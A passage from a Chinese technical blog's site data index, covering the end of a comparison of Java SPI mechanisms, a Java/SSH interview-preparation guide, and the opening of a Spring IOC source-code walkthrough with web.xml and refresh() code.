完美支持，有语法提示\n\n三种 spi 机制对比之下，jdk 内置的机制是最弱鸡的，但是由于是 jdk 内置，所以还是有一定应用场景，毕竟不用额外的依赖；dubbo 的功能最丰富，但机制有点复杂了，而且只能配合 dubbo 使用，不能完全算是一个独立的模块；spring 的功能和jdk的相差无几，最大的区别是所有扩展点写在一个 spring.factories 文件中，也算是一个改进，并且 idea 完美支持语法提示。\n\n\n# spi 的使用\n\n举个简单的例子：\n\n有个maven工程，分为三个项目：\n\n * 项目1有一个接口pay.java\n * 项目2依赖项目1，有个实现类alipay.java，在resources下创建meta-inf.services包，采用spi的方式暴露出实现类\n * 项目3依赖项目1，有个实现类weixinpay.java，在resources下创建meta-inf.services包，采用spi的方式暴露出实现类\n\n新建一个项目4，测试：\n\npublic static void main(string[] args) {\n    serviceloader<pay> services = serviceloader.load(pay.class);\n    for (pay pay : services) {\n        pay.pay();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n\n * 若项目4依赖项目1和项目2，此时项目4用的实现类为alipay\n * 若项目4依赖项目1和项目3，此时项目4用的实现类为weixinpay\n * 若项目4依赖项目1和项目2、项目3，此时项目4用的实现类为alipay、weixinpay\n\n\n# 参考\n\n * introduction to the service provider interfaces – oracle\n * dubbo spi – apache dubbo\n * creating your own auto-configuration – spring',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"SSH 架构知识点概览",frontmatter:{title:"SSH 架构知识点概览",date:"2017-07-24T16:41:12.000Z",tags:["Java"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/SSH.html",relativePath:"views/backend/SSH.md",key:"v-e10fbf58",path:"/views/backend/SSH.html",headers:[{level:2,title:"关于SSH架构的所有东西，看这一篇就够了",slug:"关于ssh架构的所有东西-看这一篇就够了",normalizedTitle:"关于ssh架构的所有东西，看这一篇就够了",charIndex:3},{level:3,title:"基本公司面试要求",slug:"基本公司面试要求",normalizedTitle:"基本公司面试要求",charIndex:29},{level:3,title:"面试准备",slug:"面试准备",normalizedTitle:"面试准备",charIndex:43},{level:4,title:"1. java基础知识",slug:"_1-java基础知识",normalizedTitle:"1. java基础知识",charIndex:499},{level:4,title:"2. SSH框架",slug:"_2-ssh框架",normalizedTitle:"2. ssh框架",charIndex:514},{level:4,title:"3. SOA架构(对比微服务架构)",slug:"_3-soa架构-对比微服务架构",normalizedTitle:"3. soa架构(对比微服务架构)",charIndex:545},{level:4,title:"4. XML",slug:"_4-xml",normalizedTitle:"4. xml",charIndex:583},{level:4,title:"5. WebService及HttpClient,电网项目尤其是WebService",slug:"_5-webservice及httpclient-电网项目尤其是webservice",normalizedTitle:"5. webservice及httpclient,电网项目尤其是webservice",charIndex:647},{level:4,title:"6. flex",slug:"_6-flex",normalizedTitle:"6. flex",charIndex:719},{level:4,title:"7. jsp(几种语言和九大隐含对象)",slug:"_7-jsp-几种语言和九大隐含对象",normalizedTitle:"7. jsp(几种语言和九大隐含对象)",charIndex:764},{level:4,title:"8. servlet",slug:"_8-servlet",normalizedTitle:"8. servlet",charIndex:824},{level:4,title:"9. jdbc",slug:"_9-jdbc",normalizedTitle:"9. jdbc",charIndex:878},{level:4,title:"10. SG_UAP平台的了解",slug:"_10-sg-uap平台的了解",normalizedTitle:"10. sg_uap平台的了解",charIndex:908},{level:4,title:"11. Tomcat与weblogic容器的区别及常用部署命令",slug:"_11-tomcat与weblogic容器的区别及常用部署命令",normalizedTitle:"11. tomcat与weblogic容器的区别及常用部署命令",charIndex:971},{level:4,title:"12. Oracle数据库,常用sql函数,存储过程的编写",slug:"_12-oracle数据库-常用sql函数-存储过程的编写",normalizedTitle:"12. oracle数据库,常用sql函数,存储过程的编写",charIndex:1052},{level:3,title:"面试流程及可能遇到的问题",slug:"面试流程及可能遇到的问题",normalizedTitle:"面试流程及可能遇到的问题",charIndex:53},{level:4,title:"项目相关",slug:"项目相关",normalizedTitle:"项目相关",charIndex:1166},{level:4,title:"可能问到的问题",slug:"可能问到的问题",normalizedTitle:"可能问到的问题",charIndex:1235},{level:3,title:"面试时注意的问题",slug:"面试时注意的问题",normalizedTitle:"面试时注意的问题",charIndex:71},{level:3,title:"自我介绍模板",slug:"自我介绍模板",normalizedTitle:"自我介绍模板",charIndex:85}],headersStr:"关于SSH架构的所有东西，看这一篇就够了 基本公司面试要求 面试准备 1. java基础知识 2. SSH框架 3. SOA架构(对比微服务架构) 4. XML 5. WebService及HttpClient,电网项目尤其是WebService 6. flex 7. jsp(几种语言和九大隐含对象) 8. servlet 9. jdbc 10. SG_UAP平台的了解 11. Tomcat与weblogic容器的区别及常用部署命令 12. Oracle数据库,常用sql函数,存储过程的编写 面试流程及可能遇到的问题 项目相关 可能问到的问题 面试时注意的问题 自我介绍模板",content:" * 关于SSH架构的所有东西，看这一篇就够了\n   * 基本公司面试要求\n   * 面试准备\n   * 面试流程及可能遇到的问题\n   * 面试时注意的问题\n   * 自我介绍模板\n\n\n\n\n# 关于SSH架构的所有东西，看这一篇就够了\n\n\n# 基本公司面试要求\n\n 1. 计算机相关专业本科以上学历，精通java语言，具有一定的软件项目开发的实际工作经验，熟悉SSH等开源框架，了解jdk的基本内容，从事过相关开发工作；\n 2. 熟悉J2EE平台企业应用开发以及SOA架构，精通XML、Web Service等相关技术，使用过flex、jsp、servlet、jdbc等相关技术开发；\n 3. 熟悉SSH、SG_UAP平台开发者优先考虑；\n 4. 了解tomcat、weblogic等web服务器；\n 5. 了解Oracle数据库，精通Sql语法，有存储过程编写经验者优先；\n 6. 责任心强，有相当强的工作压力承受能力；\n 7. 具备良好的语言沟通能力和团队协作精神；\n 8. 有良好的编写代码基础,学习能力强，有较强文字能力；\n 9. 有代码安全漏洞处理经验者优先。\n\n\n# 面试准备\n\n# 1. java基础知识\n\n# 2. SSH框架\n\n * 这个写的比较好 -- 传送门\n\n# 3. SOA架构(对比微服务架构)\n\n * SOA专题 -- 传送门\n\n# 4. XML\n\n * W3school XML教程 -- 传送门\n * 但是推荐看一下Dom4j解析xml -- 传送门\n\n# 5. WebService及HttpClient,电网项目尤其是WebService\n\n * WebService cxf -- 传送门\n\n# 6. flex\n\n * 和jsp差不多，相当于一个组件，可以自定义标签到html中\n\n# 7. jsp(几种语言和九大隐含对象)\n\n * 这篇文章写的很好,但是重点都在后边，多往后划拉划拉 -- 传送门\n\n# 8. servlet\n\n * 个人感觉是写的最好的了，知识点全覆盖有图示还带有源码讲解 -- 传送们\n\n# 9. jdbc\n\n * 基本的crud -- 传送门\n\n# 10. SG_UAP平台的了解\n\n * 听说过，类似一个开发工具，可以实现权限管理、任务调度、报表统计、系统监督等功能\n\n# 11. Tomcat与weblogic容器的区别及常用部署命令\n\n> Tomcat开源免费 WebLogic不开源不免费\n\n * 可以看看这 -- 传送门\n\n# 12. Oracle数据库,常用sql函数,存储过程的编写\n\n * Oracle 数据库 -- 传送门\n * Oracle 存储过程 -- 传送门\n * JAVA调用存储过程 --传送门\n\n\n# 面试流程及可能遇到的问题\n\n# 项目相关\n\n# 1. 做过哪些项目？介绍项目涉及的业务流程。\n\n# 2. 项目中遇到过什么困难，怎么解决的？体现个人解决问题的能力\n\n# 可能问到的问题\n\n# 程序相关\n\n# 1. 介绍自己熟悉的开发框架。比如：spring、structs\n\n * SpringMVC与structs2区别 -- 传送们\n   \n   >  * springmvc的入口是servlet，而struts2是filter\n   >  * spring mvc是基于方法的设计，而sturts是基于类(一次请求创建一个action)\n   >  * springmvc通过形参获取数据，而struts2是通过属性获取数据\n   >  * springmvc处理ajsx @ResponseBody，而struts2较麻烦\n\n# 2. 线程、进程的区别？\n\n * 一个迅雷搞定\n\n# 3. 系统性能优化\n\n * 代码优化\n * 数据库优化\n\n# 4. 第三方系统接口的开发和调用，比如restful、webService（cxf、xfire）\n\n一般就是webservice和httpclient,具体上文有介绍\n\n# 5. 服务器集群\n\n# 6. Redis、kafka、MQ\n\n * Redis简单介绍 -- 传送门\n * Spring整合Redis -- 传送门\n\n# 7. 数据加密\n\n# 8. 定时器（定时任务）\n\n * Spring整合Quartz实现定时任务的配置方法 -- 传送们\n\n# 数据库相关\n\n# 1. Oracle和MySQL的区别\n\n>  * Oracle使用rownum来实现分页，MySQL使用limit实现分页\n>  * Oracle没有主键自增特性,可以使用调用序列的方式来实现主键自增；MySQL可以在主键列之后添加auto_increment设置自增特性\n>  * Oracle有表空间的概念，MySQL没有表空间\n>  * Oracle的分组函数中select之后不能直接写非分组的其他列；MySQL如果没有聚组函数则可以写 其他列\n>  * Oracle的表存放在用户（其实是schema对象）所属的表空间的数据文件中， mySQL的表存放在某个database中（mysql一个root用户下可以有很多database）\n>  * Oracle中的一些函数和MySQL也不一样，如： ORACLE:SELECT to_date('2009-3-6','yyyy-mm-dd') VAULE FROM DUAL MySQL: SELECT STR_TO_DATE('2004-03-01', '%Y-%m-%d') VAULE\n>  * Oracle中的字符类型可以使用varchar2 MySQL不能使用该类型\n\n# 2. 存储过程、触发器是不是写过\n\n * Oracle 存储过程 -- 传送门\n\n# 3. 数据库SQL调优。可以结合自己做过的项目进行说明\n\n * sql语句调优 -- 传送门\n * 写存储过程调优\n\n# 4. 数据库备份命令、备份策略（增量备份--每天或每周、全量备份--每月或每年）\n\n * Oracle数据库三种备份方案 -- 传送门\n\n# 5. Oracle行转列、列转行\n\n * Oracle行转列(pivot、wm_concat、decode)使用总结 -- 传送门\n   \n   > 列转行： unpivot 行转列： WM_CONCAT、pivot\n\n# 其他\n\n# 1. Linux常用命令\n\n * Linux常用命令 -- 传送门\n\n# 2. Linux下部署tomcat、Weblogic服务\n\n# 3. 集群服务部署\n\n * 常见的部署出现的问题\n   \n   * 各部属的版本是否对应(如jdk版本和服务器版本)\n   * 环境的账号密码是否正确(测试环境和正式环境)\n   * 部署的url地址是否正确\n\n\n# 面试时注意的问题\n\n 1. 面试着装要正式,自然大方;\n 2. 态度要严肃认真,言谈举止等,不紧张,不散漫;可以看一下贾哥的姿态\n 3. 进门基本的问候语要有;\n 4. 自我介绍要有逻辑(毕业年限,工作年限,参与的项目(项目大概介绍,负责功能,涉及技术)必须和简历上匹配起来),工作的新得等\n 5. 问到不会的技术,能说多少就说多少,最后得表明一下,自己也是正在实践中积累学习\n 6. 介绍技术时,要挑自己熟悉的,擅长的项目介绍;能和甲方技术要求匹配最好\n\n\n# 自我介绍模板\n\n>  * 自然进门，安稳落下\n>  * 领导下午好，很高兴能来参加这次面试，我叫XXX，从事java开发XX年了， 曾用过SSH,SSM框架做过开发，了解Spring、SpringMVC， 数据库用过Oracle、MySQL, 前端框架用过BootStrap、EasyUI\n>  * 最近做过的一个项目是大东全渠道项目，大东是一家做鞋的公司，然后它想 给自己做一套零售系统嘛。 我负责的模块主要有：门店信息管理，店员信息的管理和维护，人资信息管理 和报表统计管理等。 这个项目用的技术是SSM+MySQl+dubbo+EasyUI，我在这个项目中主要学会了 dubbo通信、httpClient调接口、和项目版本管理工具git的使用\n>  * 我的基本情况就这些,请领导指示 ... ...\n>  * 待面试结束后 -> 谢谢领导！",normalizedContent:" * 关于ssh架构的所有东西，看这一篇就够了\n   * 基本公司面试要求\n   * 面试准备\n   * 面试流程及可能遇到的问题\n   * 面试时注意的问题\n   * 自我介绍模板\n\n\n\n\n# 关于ssh架构的所有东西，看这一篇就够了\n\n\n# 基本公司面试要求\n\n 1. 计算机相关专业本科以上学历，精通java语言，具有一定的软件项目开发的实际工作经验，熟悉ssh等开源框架，了解jdk的基本内容，从事过相关开发工作；\n 2. 熟悉j2ee平台企业应用开发以及soa架构，精通xml、web service等相关技术，使用过flex、jsp、servlet、jdbc等相关技术开发；\n 3. 熟悉ssh、sg_uap平台开发者优先考虑；\n 4. 了解tomcat、weblogic等web服务器；\n 5. 了解oracle数据库，精通sql语法，有存储过程编写经验者优先；\n 6. 责任心强，有相当强的工作压力承受能力；\n 7. 具备良好的语言沟通能力和团队协作精神；\n 8. 有良好的编写代码基础,学习能力强，有较强文字能力；\n 9. 有代码安全漏洞处理经验者优先。\n\n\n# 面试准备\n\n# 1. java基础知识\n\n# 2. ssh框架\n\n * 这个写的比较好 -- 传送门\n\n# 3. soa架构(对比微服务架构)\n\n * soa专题 -- 传送门\n\n# 4. xml\n\n * w3school xml教程 -- 传送门\n * 但是推荐看一下dom4j解析xml -- 传送门\n\n# 5. webservice及httpclient,电网项目尤其是webservice\n\n * webservice cxf -- 传送门\n\n# 6. flex\n\n * 和jsp差不多，相当于一个组件，可以自定义标签到html中\n\n# 7. jsp(几种语言和九大隐含对象)\n\n * 这篇文章写的很好,但是重点都在后边，多往后划拉划拉 -- 传送门\n\n# 8. servlet\n\n * 个人感觉是写的最好的了，知识点全覆盖有图示还带有源码讲解 -- 传送们\n\n# 9. jdbc\n\n * 基本的crud -- 传送门\n\n# 10. sg_uap平台的了解\n\n * 听说过，类似一个开发工具，可以实现权限管理、任务调度、报表统计、系统监督等功能\n\n# 11. tomcat与weblogic容器的区别及常用部署命令\n\n> tomcat开源免费 weblogic不开源不免费\n\n * 可以看看这 -- 传送门\n\n# 12. oracle数据库,常用sql函数,存储过程的编写\n\n * oracle 数据库 -- 传送门\n * oracle 存储过程 -- 传送门\n * java调用存储过程 --传送门\n\n\n# 面试流程及可能遇到的问题\n\n# 项目相关\n\n# 1. 做过哪些项目？介绍项目涉及的业务流程。\n\n# 2. 项目中遇到过什么困难，怎么解决的？体现个人解决问题的能力\n\n# 可能问到的问题\n\n# 程序相关\n\n# 1. 介绍自己熟悉的开发框架。比如：spring、structs\n\n * springmvc与structs2区别 -- 传送们\n   \n   >  * springmvc的入口是servlet，而struts2是filter\n   >  * spring mvc是基于方法的设计，而sturts是基于类(一次请求创建一个action)\n   >  * springmvc通过形参获取数据，而struts2是通过属性获取数据\n   >  * springmvc处理ajsx @responsebody，而struts2较麻烦\n\n# 2. 线程、进程的区别？\n\n * 一个迅雷搞定\n\n# 3. 系统性能优化\n\n * 代码优化\n * 数据库优化\n\n# 4. 第三方系统接口的开发和调用，比如restful、webservice（cxf、xfire）\n\n一般就是webservice和httpclient,具体上文有介绍\n\n# 5. 服务器集群\n\n# 6. redis、kafka、mq\n\n * redis简单介绍 -- 传送门\n * spring整合redis -- 传送门\n\n# 7. 数据加密\n\n# 8. 定时器（定时任务）\n\n * spring整合quartz实现定时任务的配置方法 -- 传送们\n\n# 数据库相关\n\n# 1. oracle和mysql的区别\n\n>  * oracle使用rownum来实现分页，mysql使用limit实现分页\n>  * oracle没有主键自增特性,可以使用调用序列的方式来实现主键自增；mysql可以在主键列之后添加auto_increment设置自增特性\n>  * oracle有表空间的概念，mysql没有表空间\n>  * oracle的分组函数中select之后不能直接写非分组的其他列；mysql如果没有聚组函数则可以写 其他列\n>  * oracle的表存放在用户（其实是schema对象）所属的表空间的数据文件中， mysql的表存放在某个database中（mysql一个root用户下可以有很多database）\n>  * oracle中的一些函数和mysql也不一样，如： oracle:select to_date('2009-3-6','yyyy-mm-dd') vaule from dual mysql: select str_to_date('2004-03-01', '%y-%m-%d') vaule\n>  * oracle中的字符类型可以使用varchar2 mysql不能使用该类型\n\n# 2. 存储过程、触发器是不是写过\n\n * oracle 存储过程 -- 传送门\n\n# 3. 数据库sql调优。可以结合自己做过的项目进行说明\n\n * sql语句调优 -- 传送门\n * 写存储过程调优\n\n# 4. 数据库备份命令、备份策略（增量备份--每天或每周、全量备份--每月或每年）\n\n * oracle数据库三种备份方案 -- 传送门\n\n# 5. oracle行转列、列转行\n\n * oracle行转列(pivot、wm_concat、decode)使用总结 -- 传送门\n   \n   > 列转行： unpivot 行转列： wm_concat、pivot\n\n# 其他\n\n# 1. linux常用命令\n\n * linux常用命令 -- 传送门\n\n# 2. linux下部署tomcat、weblogic服务\n\n# 3. 集群服务部署\n\n * 常见的部署出现的问题\n   \n   * 各部属的版本是否对应(如jdk版本和服务器版本)\n   * 环境的账号密码是否正确(测试环境和正式环境)\n   * 部署的url地址是否正确\n\n\n# 面试时注意的问题\n\n 1. 面试着装要正式,自然大方;\n 2. 态度要严肃认真,言谈举止等,不紧张,不散漫;可以看一下贾哥的姿态\n 3. 进门基本的问候语要有;\n 4. 自我介绍要有逻辑(毕业年限,工作年限,参与的项目(项目大概介绍,负责功能,涉及技术)必须和简历上匹配起来),工作的新得等\n 5. 问到不会的技术,能说多少就说多少,最后得表明一下,自己也是正在实践中积累学习\n 6. 介绍技术时,要挑自己熟悉的,擅长的项目介绍;能和甲方技术要求匹配最好\n\n\n# 自我介绍模板\n\n>  * 自然进门，安稳落下\n>  * 领导下午好，很高兴能来参加这次面试，我叫xxx，从事java开发xx年了， 曾用过ssh,ssm框架做过开发，了解spring、springmvc， 数据库用过oracle、mysql, 前端框架用过bootstrap、easyui\n>  * 最近做过的一个项目是大东全渠道项目，大东是一家做鞋的公司，然后它想 给自己做一套零售系统嘛。 我负责的模块主要有：门店信息管理，店员信息的管理和维护，人资信息管理 和报表统计管理等。 这个项目用的技术是ssm+mysql+dubbo+easyui，我在这个项目中主要学会了 dubbo通信、httpclient调接口、和项目版本管理工具git的使用\n>  * 我的基本情况就这些,请领导指示 ... ...\n>  * 待面试结束后 -> 谢谢领导！",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Spring的 IOC 源码以及流程分析",frontmatter:{title:"Spring的 IOC 源码以及流程分析",date:"2022-04-02T00:00:00.000Z",tags:["源码分析","Java"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/Spring%E7%9A%84IOC%E6%BA%90%E7%A0%81%E4%BB%A5%E5%8F%8A%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90.html",relativePath:"views/backend/Spring的IOC源码以及流程分析.md",key:"v-35d0e1bc",path:"/views/backend/Spring%E7%9A%84IOC%E6%BA%90%E7%A0%81%E4%BB%A5%E5%8F%8A%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90.html",headers:[{level:2,title:"一 前言",slug:"一-前言",normalizedTitle:"一 前言",charIndex:152},{level:2,title:"二 反射基础",slug:"二-反射基础",normalizedTitle:"二 反射基础",charIndex:160},{level:2,title:"三 设计模式",slug:"三-设计模式",normalizedTitle:"三 设计模式",charIndex:170},{level:2,title:"四 IOC流程分析",slug:"四-ioc流程分析",normalizedTitle:"四 ioc流程分析",charIndex:180},{level:3,title:"4.1 IOC流程图",slug:"_4-1-ioc流程图",normalizedTitle:"4.1 ioc流程图",charIndex:195},{level:3,title:"4.2 IOC流程图讲解",slug:"_4-2-ioc流程图讲解",normalizedTitle:"4.2 ioc流程图讲解",charIndex:211},{level:2,title:"五 核心类分析",slug:"五-核心类分析",normalizedTitle:"五 核心类分析",charIndex:227},{level:3,title:"5.0 ContextLoaderListener与它的父类ContextLoader",slug:"_5-0-contextloaderlistener与它的父类contextloader",normalizedTitle:"5.0 contextloaderlistener与它的父类contextloader",charIndex:240},{level:3,title:"5.1 classPathXmlApplicationContext",slug:"_5-1-classpathxmlapplicationcontext",normalizedTitle:"5.1 classpathxmlapplicationcontext",charIndex:289},{level:3,title:"5.2 AbstractApplicationContext",slug:"_5-2-abstractapplicationcontext",normalizedTitle:"5.2 abstractapplicationcontext",charIndex:329},{level:3,title:"5.3 prepareRefresh()",slug:"_5-3-preparerefresh",normalizedTitle:"5.3 preparerefresh()",charIndex:365},{level:3,title:"5.4 核心方法之一  obtainFreshBeanFactory()",slug:"_5-4-核心方法之一-obtainfreshbeanfactory",normalizedTitle:"5.4 核心方法之一  obtainfreshbeanfactory()",charIndex:null},{level:3,title:"5.5 prepareBeanFactory()",slug:"_5-5-preparebeanfactory",normalizedTitle:"5.5 preparebeanfactory()",charIndex:432},{level:3,title:"5.6 postProcessBeanFactory()",slug:"_5-6-postprocessbeanfactory",normalizedTitle:"5.6 postprocessbeanfactory()",charIndex:462},{level:3,title:"5.7 核心方法之一  invokeBeanFactoryPostProcessors()",slug:"_5-7-核心方法之一-invokebeanfactorypostprocessors",normalizedTitle:"5.7 核心方法之一  invokebeanfactorypostprocessors()",charIndex:null},{level:3,title:"5.8 核心方法之一  registerBeanPostProcessors()",slug:"_5-8-核心方法之一-registerbeanpostprocessors",normalizedTitle:"5.8 核心方法之一  registerbeanpostprocessors()",charIndex:null},{level:3,title:"5.9 initMessageSource()",slug:"_5-9-initmessagesource",normalizedTitle:"5.9 initmessagesource()",charIndex:591},{level:3,title:"5.10 initApplicationEventMulticaster()",slug:"_5-10-initapplicationeventmulticaster",normalizedTitle:"5.10 initapplicationeventmulticaster()",charIndex:620},{level:3,title:"5.11 onRefresh()",slug:"_5-11-onrefresh",normalizedTitle:"5.11 onrefresh()",charIndex:664},{level:3,title:"5.12 registerListeners()",slug:"_5-12-registerlisteners",normalizedTitle:"5.12 registerlisteners()",charIndex:686},{level:3,title:"5.13 核心方法之一  finishBeanFactoryInitialization(beanFactory)",slug:"_5-13-核心方法之一-finishbeanfactoryinitialization-beanfactory",normalizedTitle:"5.13 核心方法之一  finishbeanfactoryinitialization(beanfactory)",charIndex:null},{level:3,title:"5.14 finishRefresh()",slug:"_5-14-finishrefresh",normalizedTitle:"5.14 finishrefresh()",charIndex:778},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:802},{level:3,title:"源码分析中比较重要的类有",slug:"源码分析中比较重要的类有",normalizedTitle:"源码分析中比较重要的类有",charIndex:810},{level:2,title:"参考",slug:"参考",normalizedTitle:"参考",charIndex:826}],excerpt:"<Boxx/>\n<Toc/>\n<p>IOC的流程分析，深入理解具体的接口和类，内容包括ApplicationContext，BeanDefinitionReader，BeanFactory,BeanFactoryPostProcessor,FactoryBean,BeanPostProcessor,Environment等。</p>\n",headersStr:"一 前言 二 反射基础 三 设计模式 四 IOC流程分析 4.1 IOC流程图 4.2 IOC流程图讲解 五 核心类分析 5.0 ContextLoaderListener与它的父类ContextLoader 5.1 classPathXmlApplicationContext 5.2 AbstractApplicationContext 5.3 prepareRefresh() 5.4 核心方法之一  obtainFreshBeanFactory() 5.5 prepareBeanFactory() 5.6 postProcessBeanFactory() 5.7 核心方法之一  invokeBeanFactoryPostProcessors() 5.8 核心方法之一  registerBeanPostProcessors() 5.9 initMessageSource() 5.10 initApplicationEventMulticaster() 5.11 onRefresh() 5.12 registerListeners() 5.13 核心方法之一  finishBeanFactoryInitialization(beanFactory) 5.14 finishRefresh() 总结 源码分析中比较重要的类有 参考",content:'IOC的流程分析，深入理解具体的接口和类，内容包括ApplicationContext，BeanDefinitionReader，BeanFactory,BeanFactoryPostProcessor,FactoryBean,BeanPostProcessor,Environment等。\n\n\n\n * 一 前言\n * 二 反射基础\n * 三 设计模式\n * 四 IOC流程分析\n   * 4.1 IOC流程图\n   * 4.2 IOC流程图讲解\n * 五 核心类分析\n   * 5.0 ContextLoaderListener与它的父类ContextLoader\n   * 5.1 classPathXmlApplicationContext\n   * 5.2 AbstractApplicationContext\n   * 5.3 prepareRefresh()\n   * 5.4 核心方法之一 obtainFreshBeanFactory()\n   * 5.5 prepareBeanFactory()\n   * 5.6 postProcessBeanFactory()\n   * 5.7 核心方法之一 invokeBeanFactoryPostProcessors()\n   * 5.8 核心方法之一 registerBeanPostProcessors()\n   * 5.9 initMessageSource()\n   * 5.10 initApplicationEventMulticaster()\n   * 5.11 onRefresh()\n   * 5.12 registerListeners()\n   * 5.13 核心方法之一 finishBeanFactoryInitialization(beanFactory)\n   * 5.14 finishRefresh()\n * 总结\n   * 源码分析中比较重要的类有\n * 参考\n\n\n\n\n# 一 前言\n\n本文章的主要内容：\n\n（1）反射，反射是框架设计的灵魂，必须会的。\n\n（2）设计模式，框架里面体现了很多设计模式，比如单例模式，观察者模式，工厂模式等\n\n（3）IOC的流程分析，spring源码之所以难，是因为里面的接口和类真的很多，可以将其中的核心接口和类了解清楚流程，并深入看一下其中的内容。想全部的掌握spring源码很难，并且没有那么大的必要，它已经封装好了，封装就是为了让你使用的。所以，我们只要把它的核心源码弄清楚就可以了。\n\n（4）深入理解具体的接口和类，内容包括ApplicationContext，BeanDefinitionReader，BeanFactory,BeanFactoryPostProcessor,FactoryBean,BeanPostProcessor,Environment等。\n\n\n# 二 反射基础\n\n反射基础的话我为大家找了一篇清晰易懂的文章，这不是本文章的重点，请参考：\n\n传送门\n\n\n# 三 设计模式\n\n设计模式的话，重点看其中的单例，观察者，工厂即可，参考：\n\n传送门\n\n\n# 四 IOC流程分析\n\n\n# 4.1 IOC流程图\n\n\n\n百度找的马士兵教育的流程图，侵删。\n\n\n# 4.2 IOC流程图讲解\n\n（1）从XML，配置类，annotation中读取响应的配置信息。\n\n（2）如果想要对配置的信息进行人为的修改，可以采用BeanFactoryProcessor\n\n（3）然后创建对应的BeanFactory，如果这个时候扩展的话，就可以利用FactoryBean，它是用来扩展的。\n\n（4）实例化之前还可以利用BeanPostProcessor进行扩展\n\n（5）利用反射进行实例化的过程。\n\n（6）如果想要在容器的不同阶段做不同的事情，可以利用观察者模式，也就是监听器进行处理。\n\n（7）其中的Environment也是一个重要的类，获取一些环境的属性。\n\n先在脑海中有这样一张大概的流程图，然后再去看相应的源码部分抠细节。\n\n\n# 五 核心类分析\n\n以下类的内容都是双击shift查找得到的源码，由于源码过长，我真粘贴其中重要的部分进行分析。\n\n\n# 5.0 ContextLoaderListener与它的父类ContextLoader\n\n容器构建启动入口\n\n容器构建启动的入口有多种多样，这边以常用的 web.xml 配置的方式来说。\n\n首先，我们会在 web.xml 中配置 ContextLoaderListener 监听器，当 Tomcat 启动时，会触发 ContextLoaderListener 的 contextInitialized 方法，从而开始 IoC 的构建流程。\n\n另一个常用的参数是 contextConfigLocation，用于指定 Spring 配置文件的路径。\n\n<?xml version="1.0" encoding="UTF-8"?>\n<web-app version="2.5" xmlns="Java EE: XML Schemas for Java EE Deployment Descriptors" \n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="Java EE: XML Schemas for Java EE Deployment Descriptors\n         http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd">\n    <display-name>open-joonwhee-service WAR</display-name>\n \n    <context-param>\n        <param-name>contextConfigLocation</param-name>\n        <param-value>\n            classpath*:config/spring/appcontext-*.xml\n        </param-value>\n    </context-param>\n \n    <listener>\n        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n    </listener>\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nContextLoaderListener 是 Spring 的入口\n\n并且的它的父类ContextLoader存在这样一个方法，可以实现扩功能先简单知道一下\n\nrefresh（）方法是核心，并且在它之前也需要做一些准备\n\n请参考：https://blog.csdn.net/v123411739/article/details/86555733\n\nprotected void customizeContext(ServletContext sc, ConfigurableWebApplicationContext wac) {\n\tList<Class<ApplicationContextInitializer<ConfigurableApplicationContext>>> initializerClasses =\n\t\t\tdetermineContextInitializerClasses(sc);\n \n\tfor (Class<ApplicationContextInitializer<ConfigurableApplicationContext>> initializerClass : initializerClasses) {\n\t\tClass<?> initializerContextClass =\n\t\t\t\tGenericTypeResolver.resolveTypeArgument(initializerClass, ApplicationContextInitializer.class);\n\t\tif (initializerContextClass != null && !initializerContextClass.isInstance(wac)) {\n\t\t\tthrow new ApplicationContextException(String.format(\n\t\t\t\t\t"Could not apply context initializer [%s] since its generic parameter [%s] " +\n\t\t\t\t\t"is not assignable from the type of application context used by this " +\n\t\t\t\t\t"context loader: [%s]", initializerClass.getName(), initializerContextClass.getName(),\n\t\t\t\t\twac.getClass().getName()));\n\t\t}\n\t\tthis.contextInitializers.add(BeanUtils.instantiateClass(initializerClass));\n\t}\n \n\tAnnotationAwareOrderComparator.sort(this.contextInitializers);\n\tfor (ApplicationContextInitializer<ConfigurableApplicationContext> initializer : this.contextInitializers) {\n\t\tinitializer.initialize(wac);\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 5.1 classPathXmlApplicationContext\n\n从这个类的注释我提取出了这样两句话\n\ntaking the context definition files from the class path\n\nloading the definitions from the given XML files\n\n意思就是从class path下提取全局的配置文件，加载给定的XML文件，也就知道了这个类大概就是加载一些配置的。\n\n然后发现其中有两个构造方法中有refresh方法，那么这个refresh方法是干什么的呢？其实这是一个非常重要的方法，它将整个IOC的过程进行了一个串联，最关键的部分。\n\n\n\n\n# 5.2 AbstractApplicationContext\n\n上面提到了refresh方法，右键这个方法，goto，实现方法，就会到达这个重要的类，这是一个核心类，将所有的IOC过程进行了一个串联，那下面我们就对这个类的refresh方法进行一个详细的分析，依照四中给的图。然后我们将对其中的每一个方法进行具体的源码分析，深入每个方法之中。\n\n其中最重要的几个方法：\n\nConfigurableListableBeanFactory beanFactory = obtainFreshBeanFactory();\n\n\n1\n\n\ninvokeBeanFactoryPostProcessors(beanFactory);\n\n\n1\n\n\nregisterBeanPostProcessors(beanFactory);\n\n\n1\n\n\nfinishBeanFactoryInitialization(beanFactory);\n\n\n1\n\n\n然后我们将在后面的小结依次讲解各个方法。\n\npublic void refresh() throws BeansException, IllegalStateException {\n\tsynchronized (this.startupShutdownMonitor) {\n        // Prepare this context for refreshing.\n        prepareRefresh();\n        // Tell the subclass to refresh the internal bean factory.\n\t\tConfigurableListableBeanFactory beanFactory = obtainFreshBeanFactory();\n \n\t\t// Prepare the bean factory for use in this context.\n\t\tprepareBeanFactory(beanFactory);\n \n\t\ttry {\n\t\t\t// Allows post-processing of the bean factory in context subclasses.\n\t\t\tpostProcessBeanFactory(beanFactory);\n \n\t\t\t// Invoke factory processors registered as beans in the context.\n\t\t\tinvokeBeanFactoryPostProcessors(beanFactory);\n \n\t\t\t// Register bean processors that intercept bean 